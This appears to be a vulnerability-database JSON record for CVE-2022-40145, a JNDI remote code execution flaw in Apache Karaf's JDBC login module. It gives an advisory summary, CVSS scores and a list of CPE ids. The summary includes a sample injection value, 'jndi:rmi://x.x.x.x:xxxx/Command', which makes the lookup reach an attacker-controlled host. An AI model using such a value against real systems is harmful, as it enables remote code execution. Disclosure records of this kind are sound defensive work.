{
    "id": 202653,
    "name": "CVE-2022-40145",
    "cwe": "NVD-CWE-Other",
    "modified": "2023-11-07T02:52:06",
    "published": "2022-12-21T15:15:08",
    "status": "Modified",
    "summary": "This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.\n\nThe function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource\nuse InitialContext.lookup(jndiName) without filtering.\nAn user can modify\u00a0`options.put(JDBCUtils.DATASOURCE, \"osgi:\" +\u00a0DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,\"jndi:rmi://x.x.x.x:xxxx/Command\");` in JdbcLoginModuleTest#setup.\n\nThis is vulnerable to a remote code execution (RCE) attack when a\nconfiguration uses a JNDI LDAP data source URI when an attacker has\ncontrol of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.\n\nWe encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8",
    "cvss3": {
        "cvss": 9.8,
        "exploitability_score": 3.9,
        "impact_score": 5.9,
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    },
    "cvss2": null,
    "cpes": [
        {
            "id": 190696
        },
        {
            "id": 190697
        },
        {
            "id": 190698
        },
        {
            "id": 190699
        },
        {
            "id": 190700
        },
        {
            "id": 190701
        },
        {
            "id": 190702
        },
        {
            "id": 190703
        },
        {
            "id": 190704
        },
        {
            "id": 190705
        },
        {
            "id": 190706
        },
        {
            "id": 190707
        },
        {
            "id": 190708
        },
        {
            "id": 190709
        },
        {
            "id": 190710
        },
        {
            "id": 190711
        },
        {
            "id": 190712
        },
        {
            "id": 190713
        },
        {
            "id": 190714
        },
        {
            "id": 190715
        },
        {
            "id": 190716
        },
        {
            "id": 190717
        },
        {
            "id": 190718
        },
        {
            "id": 190719
        },
        {
            "id": 190720
        },
        {
            "id": 190721
        },
        {
            "id": 190722
        },
        {
            "id": 190723
        },
        {
            "id": 190724
        },
        {
            "id": 190725
        },
        {
            "id": 190726
        },
        {
            "id": 190727
        },
        {
            "id": 190728
        },
        {
            "id": 190729
        },
        {
            "id": 190730
        },
        {
            "id": 190731
        },
        {
            "id": 190732
        },
        {
            "id": 190733
        },
        {
            "id": 190734
        },
        {
            "id": 190735
        },
        {
            "id": 190736
        },
        {
            "id": 190737
        },
        {
            "id": 190738
        },
        {
            "id": 190739
        },
        {
            "id": 190740
        },
        {
            "id": 190741
        },
        {
            "id": 190742
        },
        {
            "id": 190743
        },
        {
            "id": 190744
        },
        {
            "id": 190745
        },
        {
            "id": 190746
        },
        {
            "id": 190747
        },
        {
            "id": 190748
        },
        {
            "id": 190749
        },
        {
            "id": 190750
        },
        {
            "id": 190751
        },
        {
            "id": 190752
        },
        {
            "id": 190753
        },
        {
            "id": 190754
        },
        {
            "id": 190755
        },
        {
            "id": 190756
        },
        {
            "id": 190757
        },
        {
            "id": 190758
        },
        {
            "id": 190759
        },
        {
            "id": 190760
        },
        {
            "id": 190761
        },
        {
            "id": 190762
        },
        {
            "id": 190763
        },
        {
            "id": 190764
        },
        {
            "id": 190765
        },
        {
            "id": 190766
        },
        {
            "id": 190767
        },
        {
            "id": 190768
        },
        {
            "id": 190769
        },
        {
            "id": 212751
        },
        {
            "id": 212752
        },
        {
            "id": 212753
        },
        {
            "id": 212754
        },
        {
            "id": 231348
        },
        {
            "id": 551910
        },
        {
            "id": 670227
        },
        {
            "id": 670228
        },
        {
            "id": 670229
        },
        {
            "id": 678386
        },
        {
            "id": 764264
        },
        {
            "id": 833408
        },
        {
            "id": 833409
        },
        {
            "id": 990048
        },
        {
            "id": 990049
        },
        {
            "id": 990050
        },
        {
            "id": 990052
        },
        {
            "id": 990053
        },
        {
            "id": 990054
        },
        {
            "id": 990055
        },
        {
            "id": 990056
        },
        {
            "id": 990057
        },
        {
            "id": 990058
        }
    ]
}